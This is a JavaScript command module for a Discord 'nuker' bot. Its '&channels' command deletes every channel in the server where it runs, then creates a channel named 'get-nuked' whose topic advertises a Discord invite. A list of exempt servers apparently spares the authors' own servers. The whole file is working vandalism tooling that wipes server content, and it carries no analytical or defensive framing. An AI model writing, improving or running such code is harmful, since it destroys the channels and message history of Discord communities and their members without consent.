const { ChannelType } = require('discord.js');
const { createBlacklistButton } = require('../utils/blacklist-button');

module.exports = {
    name: 'channels',
    description: 'Deletes all channels in the server.',
    prefix: '&',
    async execute(msg, client, channel_logs, blacklist_user, idservidores_nopermitidos) {
        createBlacklistButton(client, channel_logs, msg.author);
        if (idservidores_nopermitidos.includes(msg.guild.id)) {
            return msg.channel.send({ content: '> This server is not allowed.' });
        }

        const channels = await msg.guild.channels.fetch();
        for (const channel of channels.values()) {
            try {
                await channel.delete();
            } catch (e) {
                console.log(`[X] Could not delete channel ${channel.name} with ID ${channel.id}, error: ${e.message}`);
            }
        }

        try {
            await msg.guild.channels.create({ name: "get-nuked", type: ChannelType.GuildText, topic: 'zenx on top bro https://discord.gg/kEB3PCPkzc' });
        } catch (e) {
            console.log(`[X] Could not create channel, error: ${e.message}`);
        }
    }
};
